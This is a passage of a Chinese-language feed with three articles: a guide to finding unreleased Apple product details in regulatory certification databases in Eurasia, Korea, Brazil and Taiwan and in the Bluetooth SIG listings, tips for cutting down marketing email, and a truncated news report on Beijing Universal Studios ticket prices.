href=\"https://www.macrumors.com/2018/07/05/%20Apple-registers-new-macbooks-ipads-eec/\">MacRumors，2018 年 7 月 5 日报道</a>）</p>\n<p>八款未发布 Mac 型号现身欧亚经济委员会监管申报。（<a href=\"https://www.macrumors.com/2020/10/13/eight-unreleased-mac-models-appear-in-filings/\">MacRumors，2020 年 10 月 13 日报道</a>）</p>\n</blockquote>\n<p>欧亚经济委员会（Euraisa Economic Committee, EEC）近年屡屡在新品传闻中立功，其思路也尤为清奇，与电气、电磁和无线电监管完全没有关系。</p>\n<p>如果你对 EEC 这个名字比较陌生，这里只需知道它是俄罗斯主导的欧亚经济联盟（Eurasian Economic Union, EAEU）的常设管理机构。根据其 2015 年发布的<a href=\"https://docs.eaeunion.org/docs/ru-ru/01410399/clcd_03062016_57\">第 30 号决定</a>（PDF 链接，仅俄语），将「加密设备」进口到 EAEU 成员国（俄罗斯、哈萨克斯坦、白俄罗斯、吉尔吉斯斯坦和亚美尼亚）必须视情况通过申报、决定或许可。</p>\n<p>EEC 对「加密设备」的定义非常宽泛。包括电脑、手机、路由器、软件在内的科技类产品，只要包含令牌、密钥、加密通讯等被认定为与「密码学」相关的功能，都在规制范围之内。<a href=\"https://en.cyclopedia.ifcg.ru/wiki/Legal:Regulation_on_Notification#Form_of_Notification\">申报内容</a>包括产品名称、型号、用途、使用的加密算法等。</p>\n<p>上面列举的两项报道中，媒体正是通过翻阅 EEC 的加密设备申报信息，提前于其他国家监管披露确认了 Apple 新品的存在和型号数字；这些信息事后都被证明是准确的。此外，今年 6 月上旬，ECC 数据库中已经<a href=\"https://www.macrumors.com/2021/06/11/%20Apple-registers-iphone-13-models-eurasia/\">出现了 7 款新的 iPhone</a>，申报的型号数字并不在已上市范围内，因而一般推测这就是即将上市的 iPhone 13 系列。</p>\n<p>向 ECC 申报的产品都会在其<a href=\"https://portal.eaeunion.org/sites/odata/_layouts/15/Portal.EEC.Registry.Ui/DirectoryForm.aspx?ViewId=859ec98d-f4fe-423a-b6bc-d01b53fd4b7c&amp;ListId=0e3ead06-5475-466a-a340-6f69c01b5687&amp;ItemId=232#\">官方数据库</a>中公布。以查找 Apple 的申报记录为例，打开网页后在「Найти во всех записях」（在所有项目中检索）框中输入「 Apple Inc」即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/5ab7bfec6233151cf49534f1a0a9dba7\" alt=\"\"></figure><h3><strong>韩国</strong></h3>\n<blockquote><p>疑似 Apple Watch Series 6 电池通过<strong>韩国监管批准</strong>，容量增大（<a href=\"https://9to5mac.com/2020/08/01/%20Apple-watch-series-6-battery-leak/\">9to5Mac，2020 年 8 月 1 日报道</a>）</p></blockquote>\n<p>韩国的认证管理较为分散，其国家统一认证标志 KC 是由多个部门原有认证标志合并而来，覆盖了诸多领域的认证、认可要求。</p>\n<p>就 iPhone 等电子、通讯产品而言，有关法规主要是<a href=\"https://elaw.klri.re.kr/eng_service/lawView.do?hseq=46477&amp;lang=ENG\">《电器用品和生活用品安全管理法》</a>（전기용품 및 생활용품 안전관리법），其规定电器用品在出库前或通关前需要向认证机构申请及获取相关的安全认证；相关的主管部门则是负责电气安全的韩国技术和标准局（KATS），和负责无线电频谱管理的韩国无线电研究署（RRA）。</p>\n<p>在上面 Apple Watch 的例子中，出现在 <a href=\"https://safetykorea.kr/release/certDetail?certNum=YU10448-20011\">KATS 安全申报信息</a>中的并非手表本身，而是一款型号为 A2327、容量为 303.8 毫安时的<strong>电池</strong>。由于其尺寸、容量与前代（Series 5）的电池相仿，且制造商是常为 Apple 供货的东莞新能德（NVT），因此被推测为是当时尚未发布的 Series 6 的电池。这一推断后来通过<a href=\"https://www.ifixit.com/Teardown/%20Apple+Watch+Series+6+Teardown/136694\">拆解</a>得到印证。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/629c123ecad26ce45077f9543570ddad\" alt=\"\"></figure><p>要查询韩国的电气安全认证信息，可以前往 KATS 下辖的产品安全信息中心<a href=\"https://safetykorea.kr/release/certificationsearch\">搜索页面</a>。通过生产商名称（제조업체명）、型号名称（모델명）等条件即可定位到产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/69a89953aae284e82de7c809184baf85\" alt=\"\"></figure><p>至于针对产品整机的 RRA 型式认证，尽管也能反映产品信息，但披露内容远不如 FCC 丰富，对于预测的价值有限，也很少被媒体报道引用。如有兴趣，可前往 <a href=\"https://www.rra.go.kr/ko/license/A_c_search.do#\">RRA 官方网站查询页面</a>尝试查询，输入时间范围（인증/등록 연월일）和申请人名称（상 호）「 Apple Inc」后搜索即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/c8db814d57ff4e6544cfd8a731c502b9\" alt=\"\"></figure><h3><strong>巴西</strong></h3>\n<blockquote><p><strong>巴西认证信息</strong>表明 iPhone 12 Mini 电池容量为 2227 毫安时，iPhone 12 电池容量为 2815 毫安时。（<a href=\"https://www.macrumors.com/2020/10/16/iphone-12-12-mini-battery-capacity/\">MacRumors，2020 年 10 月 16 日报道</a>）</p></blockquote>\n<p>作为拉丁美洲最大的经济体，巴西是 Apple 着力发展的市场之一。该国电信法规同样对于产品认证和申报提出了要求，从而带来了另一个挖掘信息的来源。</p>\n<p>根据巴西<a href=\"https://informacoes.anatel.gov.br/legislacao/leis/2-lei-9472#art19\">《一般电信法》</a>（Lei Geral das Telecomunicações, 9472/97），巴西国家电信局（Agência Nacional de Telecomunicações，ANATEL）负责监管巴西的电信事务，主管电信设备的认证事宜。根据 ANATEL 的<a href=\"https://informacoes.anatel.gov.br/legislacao/resolucoes/2019/1350-resolucao-715\">《电信产品符合性评估和批准条例》</a>（Regulamento de Avaliação da Conformidade e de Homologação de Produtos Para Telecomunicações），<a href=\"https://informacoes.anatel.gov.br/legislacao/atos-de-certificacao-de-produtos/2020/1493-ato-7280\">特定的电信产品</a>必须经过符合性认证（Certificado de Conformidade Técnica）才能在巴西境内上市销售。</p>\n<p>在上面的例子中，MacRumors 援引了<a href=\"https://tecnoblog.net/375541/iphone-12-pro-e-homologado-na-anatel-iphone-12-mini-tem-bateria-de-2-227-mah/\">巴西当地网站的发现</a>。巴西不是 iPhone 产品的首发地区，这条信息也是在 iPhone 12 发布会后才上线的，其价值并不在于预告新品，而是列举了详细的电池数据信息，使人们得以在新品上市之前得知这项 Apple 不愿公开披露的数据。</p>\n<p>ANATEL 的系统似乎处于新旧版本交替的阶段，检索特定厂商或产品的认证信息，需要在两个网站中来回切换。首先，在<a href=\"https://informacoes.anatel.gov.br/paineis/certificacao-de-produtos/consulta-de-produtos\">产品查询</a>（Consulta de Produtos）页面，然后根据申请人（Nome do Solicitante）、制造商（Nome do Fabricante）或型号（Modelo）等信息检索，找出产品的批准编号（Número de Homologação）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/aeed8cbaf9636c00150e4968260cd784\" alt=\"\"></figure><p>然后，前往<a href=\"https://sistemas.anatel.gov.br/mosaico/sch/publicView/listarProdutosHomologados.xhtml#\">「认证查询」</a>（Consultar Produtos Homologados e (ou) Certificados）页面，填入上一步找到的批准编号并点击「筛选」（Filtrar）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/9932e84d3863ddce8152a6223444e0a1\" alt=\"\"></figure><p>最后，点击产品列表右侧的放大镜图标下载申请资料附件的压缩包，即可看到详细的认证信息（certificado）、产品参数（espec）、内外照片（fotos）等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/50e7dd2997394de7119fe31562594246\" alt=\"\"></figure><h3><strong>台湾地区</strong></h3>\n<blockquote><p>Beats Studio Buds 的信息在发布前继续浮现，<strong>台湾 NCC 数据库</strong>中出现了新的照片和细节。（<a href=\"https://www.macrumors.com/2021/06/09/beats-studio-buds-regulatory-database/\">MacRumors，2021 年 6 月 9 日报道</a>）</p></blockquote>\n<p>根据台湾地区<a href=\"https://law.moj.gov.tw/LawClass/LawAll.aspx?pcode=K0060111\">《电信管理法》</a>，连接公众电信网路之电信终端设备应符合电气安全、电磁相容等方面的技术规范，并经审验合格，始得制造或输入。根据<a href=\"https://law.moj.gov.tw/LawClass/LawAll.aspx?pcode=K0060136\">《电信终端设备审验管理办法》</a>，「国家通讯传播委员会」（NCC）负责电信终端设备审验，申请需要提交检验报告、内外照片、测试配置照片等资料。</p>\n<p>不过，由于台湾地区不在 Apple 很多产品的首发地区之列，且 NCC 也允许对外观照片等审验资料<a href=\"https://law.moj.gov.tw/LawClass/LawSingle.aspx?pcode=K0060136&amp;flno=21\">申请保密</a>，故其披露的信息一般对于新品预测帮助不大，更多是能帮到台湾地区用户预测在台上市时间。</p>\n<p>尽管如此，因为 Apple 在不同地区递交文件存在时间差，NCC 有时也会提前透露「天机」。在上面的例子中，临近发布的 Beats Studio Buds 就提前在 NCC 网站上披露，揭晓了这款耳机的<a href=\"https://www.macrumors.com/2021/06/09/beats-studio-buds-regulatory-database/\">外观照片</a>等诸多细节，而相应的 FCC 申报文件还没有通过临时保密期。</p>\n<p>NCC 的认证资料在其<a href=\"https://nccmember.ncc.gov.tw/\">「会员入口网」</a>上披露。打开后，点击左侧的「手机型式认证资料查询」（对于 iPhone 和蜂窝数据版 iPad）或「型式认证资料查询」（对于其他 Apple 产品），在「厂牌」中输入「 Apple」，然后选择所需的审验合格日期范围即可搜索。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/02/3c2785967daf952a4abd96ffd9c3fa42.png\"></figure><p>在结果页的产品名称左侧点击「检视」，可以查阅具体的申报信息，包括外观照片等附件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/0ff5b96e4cfcc46586e09d7efcdd185e\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/b539f1ed69e8f9d4f79631c1c9e7bc82\" alt=\"\"></figure><p>除了 NCC 官方网站，前文提及的 FCCID.io 网站同样收集了<a href=\"https://fccid.io/NCC/\">NCC 的披露信息</a>，但明显不如该站的 FCC 检索功能完善。</p>\n<h3><strong>蓝牙认证</strong></h3>\n<blockquote>\n<p><strong>蓝牙组织记录</strong>表明，具有健康追踪功能的 AirPods 即将到来。（<a href=\"https://%20appleinsider.com/articles/18/11/05/health-tracking-airpods-are-on-the-way-suggests-bluetooth-groups-records\"> AppleInsider，2018 年 11 月 5 日报道</a>）</p>\n<p>Apple 在<strong>蓝牙产品数据库</strong>中以「B2002」的代号名称备案了神秘的「个人计算机」产品。（<a href=\"https://www.macrumors.com/2020/10/27/%20Apple-b2002-personal-computer-bluetooth-database/\">MacRumors，2020 年 10 月 27 日报道</a>）</p>\n</blockquote>\n<p>这部分内容严格来说不应该与前面几种披露信息并列，因为它并不是由政府机关管辖的，而是由一个标准组织——蓝牙技术联盟（Bluetooth Special Interest Group, SIG）负责。不过，考虑到蓝牙技术在 Apple 产品中的普遍性，这里姑且一并介绍。</p>\n<p>这项认证之所以会存在，是因为蓝牙并不是一项「开放」的技术，其商标和专利由蓝牙 SIG 持有。包括 Apple 在内的厂商必须经过 SIG 的授权，才能使用蓝牙技术和标识，而包含蓝牙功能的产品也必须经过 SIG 的<a href=\"https://www.bluetooth.com/develop-with-bluetooth/qualification-listing/\">测试和认证</a>才能上市流通。</p>\n<p>一般而言，蓝牙认证信息对于推测新品意义不大。这是因为根据 <a href=\"https://support.bluetooth.com/hc/en-us/articles/360049491271-What-is-the-policy-for-Publish-Date-\">SIG 的政策</a>，产品只需在上市和分销前完成登记（listing）即可，且登记的产品可以要求延期至多 90 天公布（publish）。例如，iPhone 12 系列的信息就是到 2020 年 12 月底才公布的，比上市晚了两个多月。但也有例外——在上述第一个列子中，<a href=\"https://launchstudio.bluetooth.com/ListingDetails/65645\">AirPods 2 的信息</a>早在 2018 年 11 月就率先发布，比 2019 年 3 月的上市时间早了接近半年（但报道中所谓「健康追踪功能」，则是媒体将其他渠道的传闻张冠李戴到蓝牙认证上的讹传）。</p>\n<p>根据<a href=\"https://3pl46c46ctx02p7rzdsvsg21-wpengine.netdna-ssl.com/wp-content/uploads/Files/Membership/PRD_DPD_Resolutions.zip\">《蓝牙声明流程文档》</a>（Bluetooth Declaration Process Document, DPD），使用相同蓝牙部件或蓝牙部件组合的多款产品，可以共用一条登记信息；已经登记公布的信息也可以事后修订。还是以 AirPods 2 为例，其最初公布时的产品名称还是「AirPods」，正式上市前夕才修订为「AirPods 2」，而且同一条登记信息中之后陆续加入了 AirPods Pro 和多款 Beats 耳机的信息，间接表明这些产品蓝牙部件的设计是基本一致的。</p>\n<p>上述第二则报道对应的蓝牙认证信息，则至今尚未完全揭秘。<a href=\"https://launchstudio.bluetooth.com/ListingDetails/111989\">这则信息</a>最早出现于 2020 年 10 月底，产品名称只列举了一个代号「B2002」，而类型为「个人计算机」，因此当时被推测为与尚未上市的 Apple silicon 版 Mac 相关。后来，M1 芯片的几款 Mac 产品确实被陆续追加到了这条记录中，但「B2002」还在原地岿然不动，一些媒体将其视作未来 M 系列芯片 Mac 的信号。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/8bd21086bb12ec84b7c236de42e41452\" alt=\"\"></figure><p>蓝牙 SIG 提供了一个称为 <a href=\"https://launchstudio.bluetooth.com/Listings/Search\">Launch Studio</a> 的系统，供会员申报和公众查询之用。打开后，展开「高级搜索」（Advanced Search）选项，在「公司」（Company）中填写「 Apple Inc.」，然后将结果按「登记日期」（Listing Date）倒序排列即可看到 Apple 最新的蓝牙认证信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/de7e019b9235c872057864c44e157a64\" alt=\"\"></figure><h3><strong>结语</strong></h3>\n<p>坦率地说，本文介绍的监管披露信息源，其资讯价值本身是有限的。费大力气从监管部门网站上捕风捉影，所得信息量往往还不如供应链关系人士的一句可否。更何况，对于我们普通用户而言，即使知道了 Apple 的「小道消息」，充其量也只是作为茶余饭后的谈资，不可能指望凭此取得什么商机或收益。</p>\n<p>相比之下，本文更主要的目的在于，通过在新品资讯报道的惯用模式上追问一句「为什么」，提倡一种追求准确、花功夫核查事实的报道方式，和一种批判性、探究性的阅读方式。作为媒体，并非因为只是报道「传闻」，就可以漫不经心地随手复制，以至以讹传讹；作为读者，除了「看个乐子」，也不妨对传闻所言刨根问底，增长见识的同时，也能对不同媒体可信度高低形成判断。</p>\n<p>此外，尽管本文主要以 Apple 产品资讯为例，但涉及的监管信息却不限于 Apple ，而是与各类科技产品以至消费品都息息相关。因此，本文介绍的检索思路和使用方式也可以用于获取其他品牌的新品信息，或者帮助我们在消费过程中详细调查产品信息，作出准确判断和理性选择。</p>\n<h3><strong>延伸资料</strong></h3>\n<ul>\n<li>商务部编写的<a href=\"http://www.mofcom.gov.cn/article/ckzn/index.shtml\">《出口商品技术服务指南》</a>，其中最相关的是关于「计算机及其外设产品」的指南，详细列举了世界各国或地区关于计算机及其相关外设产品市场准入要求（2020 版，第 13 页以下）。</li>\n<li>美国商务部按国别整理的<a href=\"https://www.trade.gov/ccg-landing-page\">商务指南</a>，与产品认证相关的内容在相应国家页面「关税、规章和标准」（Customs, Regulations &amp; Standards」&gt;「贸易标准」（Standards for Trade）分类下。</li>\n<li>世贸组织整理的各成员<a href=\"https://importlicensing.wto.org/members\">技术性贸易壁垒</a>（TBT，产品认证等进口许可可能构成一种贸易壁垒）。</li>\n</ul>\n<p>题图来源：By <a href=\"https://unsplash.com/@rmrdnl\">Daniel Romero</a> via <a href=\"https://unsplash.com/photos/73tFTwOrKPg\">Unsplash</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68527"},{"title":"一日一技 | 防治骚扰邮件，我们可以从这些方面入手","date":"2021-09-02 03:30:00","description":"\n<p>某一天凌晨，忙了一天的我即将入眠之际，耳边突然响起一声手机提醒：一封凌晨两点的邮件，内容是什么呢 —— Steam 游戏打折。亮晃晃的屏幕和无关紧要的内容赶走了一部分睡意。半个小时后，万籁俱寂，又一声「惊雷」般的邮件提醒 —— Pinterest 的官方公告。凌晨两位狠狠拍打我家门的报信人，却只为告诉我超市上新和打折的消息，换做是谁也难以接受。</p>\n<p>海外的广告营销邮件能在意想不到的时刻给你以「惊吓」，少数招聘类网站更是用邮件轰炸的方式提醒你它们的存在。但「魔高一丈，道却只高一尺」，各类垃圾邮件过滤功能作用不大，它们似乎更擅长拦截正常邮件。划掉通知，删除邮件或者拉黑单个邮箱则治标不治本。要预防和治理这些骚扰邮件还得靠用户自己。</p>\n<p>不难发现，收到一封构成骚扰事实的邮件有三个必要条件：暴露的邮箱地址；发邮件的服务商；设备的邮件通知。本文亦从这三个方面出发，分享一些有效防治广告营销邮件的技巧。</p>\n<h2>不公开重要的邮箱地址</h2>\n<p>不公开的邮箱大概率不会收到骚扰邮件（除了来自邮件服务商本身）。这对于我们的私人邮箱，业务邮箱来说是必要的。一旦注册了各种服务，免不了要收取一些验证码和账号安全方面的邮件。且事实上，用户无法控制网站和 App 服务商的意愿，只要公开了自己的邮箱，就有被骚扰的风险。</p>\n<p>为了让私人和工作学习上的重要消息不会淹没在验证码、广告营销邮件中，本文建议读者首先将私人邮箱，业务邮箱和在互联网上用于注册各类服务的邮箱分开来，使用不同的地址。</p>\n<p>如果要在可以被公开检索到的网站、App 放上自己的邮箱，建议不要填 <code>hi@example.com</code>，而是将中间的 <code>@</code> 用其他符号替代，防止被恶意的爬虫获取。</p>\n<h2>使用一次性邮箱</h2>\n<p>很多 App，网站都必须要提供邮件注册账号才能实现某些功能。对那些不知名的和只需要使用一次的服务，尤其是网络工具站、资源下载站，保险的做法是不提供自己的邮箱。骚扰邮件还不是最主要的问题，这些服务商能不能甚至会不会保护我们的账号密码才更值得担心。</p>\n<p>使用一次性邮箱可以在不暴露邮箱的前提下使用这些服务。个人长期使用的两个一次性邮箱是：<a href=\"https://10minutemail.net/\" target=\"_blank\">10 Minute Mail</a> 与 <a href=\"http://www.yopmail.com/zh/\" target=\"_blank\">YOPmail</a>。</p>\n<p>和字面上意思一样，10 Minute Mail 提供一个 10 分钟后即被删除的邮箱。你也可以申请随机另一个邮箱地址或者延长使用期限。它定时更换邮箱域名，防止自己被服务商拉黑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4jtb34tcvciqab00.png\"></figure><p><a href=\"http://www.yopmail.com/zh/\" target=\"_blank\">YOPmail</a> 是另一种风格，你可以自行选择一个以 <code>@yopmail</code> 结尾的邮箱地址，但这个邮箱很可能被其他人使用过，好处是这个邮箱地址不会被删除。从这些使用过的邮箱收到的无数骚扰、诈骗邮件中，你也可以一窥邮箱被泄露的后果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4k5b34tcvciqab0g.png\"></figure><p>如果你拥有域名的话，注册一个阿里，网易，Yandex 的免费域名邮箱亦可以充当一次性邮箱。</p>\n<h2>邮件转发和邮箱别名</h2>\n<p>一次性邮箱随时使用，随时弃用，但一些常用的一次性邮箱已经被服务商拉黑；某些以后可能还会用到的服务，用一次注册一次也不太方便。这种情况下，我们可以考虑使用邮件转发和邮件别名功能。</p>\n<p>邮件转发的思路是先注册一个可以删除的邮箱地址，信件通过转发给主要邮箱的方式收取，万一哪一天不想使用此服务，直接删掉这个邮箱地址，或者停止转发邮件即可。目前国内大部分邮箱提供商注册和删除邮箱都需要一些工夫，甚至还有 foxmail 这种注销地址后，开放给其他用户使用的政策。因此个人建议使用注册删除都更简单的国外邮箱服务。</p>\n<p>邮箱别名是上面思路的简化版。以我在使用的 Outlook 为例，它允许用户在主要地址之外，创建其他的别名。在 <a href=\"https://account.live.com/names/manage\" target=\"_blank\">此网址</a> 配置好别名，用这个别名注册网络账号。登录主地址可以收取所有的别名邮件。别名也可以随时删除。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4kdb34tcvt9nu7dg.png\"></figure><p>除了手动设置的别名外，Outlook、Gmail 等邮箱还支持另一种无需配置的别名<sup class=\"ss-footnote\" href=\"\" title=\"相关内容参看此处：https://support.google.com/mail/answer/22370\" footnote-id=\"1\">1</sup>。假设有邮箱：<code>hi@gmail.com</code>，在注册网络服务时我们其实可以填写 <code>hi+@gmail.com</code>，比如说：</p>\n<ul>\n<li>在注册 Newsletter 时，填写 <code>hi+news@gmail.com</code>\n</li>\n<li>在招聘类服务时，可以填写 <code>hi+jobs@gmail.com</code>\n</li>\n<li>……</li>\n</ul>\n<p>发送给这些邮箱地址的邮件都会被 <code>hi@gmail.com</code> 收取。这种别名的设置方式可以和邮件规则配合使用。</p>\n<p>一次性邮箱和单独设置的邮件别名也适合对付许多账号无法真正删除的服务商。将账号邮箱修改为可以注销的邮箱地址，然后删邮箱，就间接实现了注销账号的效果。如此操作可以防止那些很长时间都不用的网站 App 突如其来的邮件。</p>\n<h2>退订营销和通知邮件</h2>\n<p>还顾及用户体验的主流服务商会提供开/关广告邮件的选项，这些选项一般会出现在：</p>\n<ol>\n<li>注册时：以「接收服务通知」之类的小字出现在注册选项中；</li>\n<li>账号管理界面：一般在「通知」、「广告」、「隐私」之类的选项下；</li>\n<li>邮件底部：一行小小的「退订」、「Unsubscribe」。</li>\n</ol>\n<p>注册时，不想收到「产品通知」的用户记得留心第一项有没有被默认勾选；第三项可以在收到广告邮件时有针对性的关闭，但其效果也因服务商而异，就像手机短信中的「TD」。</p>\n<p>提供了第二种管理邮件通知形式的服务商，往往都提供了比较细致的分类。想要清净的话，只选择有关帐号安全的通知，其他的一律关闭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4klb34tcvt9nu7e0.png\"></figure><h2>用邮件规则管理邮件</h2>\n<p>退订营销和通知邮件的选择仅有少数服务商提供，个人还遇到过不少邮件通知极其频繁的国内服务，它们不提供任何退订的选项，若一时还不能注销帐号或删除邮箱，只消这一个服务商，就能让设置邮件别名，邮件转发的工夫全都白费。</p>\n<p>邮件规则那时挽救我于水火之中。几乎所有邮箱在转发全部邮件选项之外，还在邮件规则中提供了根据设定规则转发的功能。我们可以利用邮件规则，将含有特定关键词，来自特定地址的邮件转发到我们的主邮箱中。下图中，我设置了将含有验证码的邮件转发到主邮箱的选项：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4ktb34tcu4bur09g.png\"></figure><p>使用了邮件别名一节中 <code>hi+&lt;关键字&gt;@gmail.com</code> 的方式注册网络服务，相当于对邮件来源提前进行了筛选。不同类型的邮件将会有不同的收件地址，我们可以利用这一点配置邮件规则。比如说将所有招聘类邮件全部移动到垃圾箱，将 Newsletter 类邮件标记已读并移动到某个文件夹：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4l5b34tcvt9nu7eg.png\"></figure><h2>移动设备的勿扰模式</h2>\n<p>在不恰当的时间中发送的任何邮件对于用户来说都是骚扰。文章开头提到的情况就是如此。此时我们可求助于系统级别的勿扰模式 —— 在特定的时间段中禁用通知铃声，不显示通知。不会永远看不到消息，也不会影响睡眠与工作。</p>\n<p>移动设备大都内置了「Do not Disturb」功能。以 Android 为例，我们可通过设置 App 搜索「勿扰」，或者长按通知栏的开关唤出勿扰设置。下图中，我设置了当睡眠或有日历活动时，除了微信、闹钟外的所有通知都静音且不显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mb4ldb34tcu4bur0a0.png\"></figure><h2>总结</h2>\n<p>在防止邮箱地址暴露这件事情上，几个注重隐私的厂商也有努力。比方说 Apple 提供了隐藏真实邮箱登录其他网站的技术手段；Cloudflare 对托管于其中的网站提供「Scrape Shield」服务，用以模糊处理电子邮件地址。使用这些服务的读者亦可以留意。</p>\n<p>想要像本文提倡的那样同时使用多个邮件地址，我们最好搭配一个密码管理器。它不仅能生成高强度的密码，也能辅助用户更方便地管理各类互联网帐号，让我们不需要再费心思去记各种服务对应的邮箱。</p>\n<p>以盈利为目的的公司从不会主动放弃成本不高的邮件推广渠道，但好在邮件比手机短信更加自由可控。如果读者也苦于骚扰邮件，不妨试试本文提到的方法。</p>\n<p>题图：<a href=\"https://www.freepik.com/vectors/business\" target=\"_blank\">Business vector created by stories - www.freepik.com</a></p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li>\n<a href=\"https://sspai.com/post/65547\" target=\"_blank\">简单的 Tasker 上手实例：及时回应勿扰模式下的重要</a><a href=\"https://sspai.com/post/65547\">来电</a>\n</li>\n<li><a href=\"https://sspai.com/post/67520\" target=\"_blank\">iOS / iPadOS 15 公测版来了，哪些新功能值得尝鲜？</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68539"},{"title":"北京环球影城 9 月 14 正式开放预订，票价 418 元起，具体情况如何？这个价格你可以接受吗？","date":"2021-09-01 12:49:09","description":"\n<p><b>北京环球影城开园当天门票价格638元，“贵宾体验”显示售罄</b></p>\n<p>9月1日，北京环球度假区宣布将于9月14日起正式向公众发售包括北京环球影城指定单日门票在内的多种票务产品，度假区内的两家酒店也将同步开启预订。以同程旅行、携程旅行、去哪儿旅行、飞猪旅行等为代表的北京环球度假区旅游渠道官方授权合作伙伴已做好票务发售预订准备工作，等待票务预订开启。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-243c4f7ba4a869f04dae4a1ffe398a15_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"679\" data-rawheight=\"548\" data-watermark=\"original\" data-original-src=\"v2-243c4f7ba4a869f04dae4a1ffe398a15\" data-watermark-src=\"v2-20f815098e1a82ce7eda58057fa5c75b\" data-private-watermark-src=\"v2-05317d270eed8787dc080fbca456f715\"></p>\n<p><br></p>\n<p>北京环球度假区旅游渠道官方授权合作伙伴。图/北京环球度假区官网截图</p>\n<p>北京环球影城指定单日门票将采用四级票价结构，推出淡季日、平季日、旺季日和特定日门票。其中，淡季日门票价格为418元，平季日门票价格为528元，旺季日门票价格为638元，特定日门票价格为748元。</p>\n<p>新京报记者在北京环球度假区微信小程序上发现，小程序已上线“在线购票”页面，预订页面已显示自9月20日起至12月12日的入园票价，但尚无法进行预订。根据页面显示，9月20日至10月1日，为638元的旺季门票价格；10月2日至7日，为748元的特定日门票价；10月1日至11月14日的周一至周四，为528元的平季日门票价格，周五至周日为旺季门票价格；11月22日至12月12日的周一至周四，为418元的淡季日门票价格，周五至周日为平季日门票价格。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-69f50aa7cc10195360614c4787797d0e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1496\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-69f50aa7cc10195360614c4787797d0e\" data-watermark-src=\"v2-a1fba6d4267966e42794f23e829b698b\" data-private-watermark-src=\"v2-9ed2c5760c6122c60523fd9321464507\"></p>\n<p><br></p>\n<p>新京报记者注意到，飞猪旅行上的“北京环球度假区旗舰店”现已上线三大产品，分别为北京环球影城指定单日票价（315元-748元）、北京环球度假区指定项目优先就座机会各1次（400元）、北京环球度假区指定项目优先就座机会无限次（500元），均在9月14日零点开售。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c0ed2bbfe631e77b82ff8c5ce727ab4b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2338\" data-watermark=\"original\" data-original-src=\"v2-c0ed2bbfe631e77b82ff8c5ce727ab4b\" data-watermark-src=\"v2-cedef05cb86b359ad68df9be59e6c5dc\" data-private-watermark-src=\"v2-05ac869133aba09157bab9fae8617e12\"></p>\n<p><br></p>\n<p>除此之外，北京环球度假区还公布了“贵宾体验”“私享贵宾体验”的价格，分别为1200元起、1700元起，其中，“贵宾体验”的基本价格包括1位游客，“私享贵宾体验”基本价格包括最多3位游客。“贵宾体验”和“私享贵宾体验”的价格均包含入园门票、环球优速通等，此外还可享受贵宾入园快速通、专属绝佳观演席位、全程专属导览服务、免排队玩遍景点等服务，另外，“私享贵宾体验”还可以拥有优先IP互动、代客泊车等服务。</p>\n<p>目前，9月20日的“贵宾体验”和“私享贵宾体验”均显示已售罄，9月21日至10月1日，“贵宾体验”价格为1900元，“私享贵宾体验”的价格为2900元；10月2日，“贵宾体验”和“私享贵宾体验”的价格分别为2300元、3800元；10月3日至5日的“贵宾体验”和“私享贵宾体验”的价格分别为2800元、5000元。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e27bfb31957e7a3ddd17e0f603b9d5f9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1350\" data-watermark=\"original\" data-original-src=\"v2-e27bfb31957e7a3ddd17e0f603b9d5f9\" data-watermark-src=\"v2-b60de776b529fad12a6db10c4d964360\" 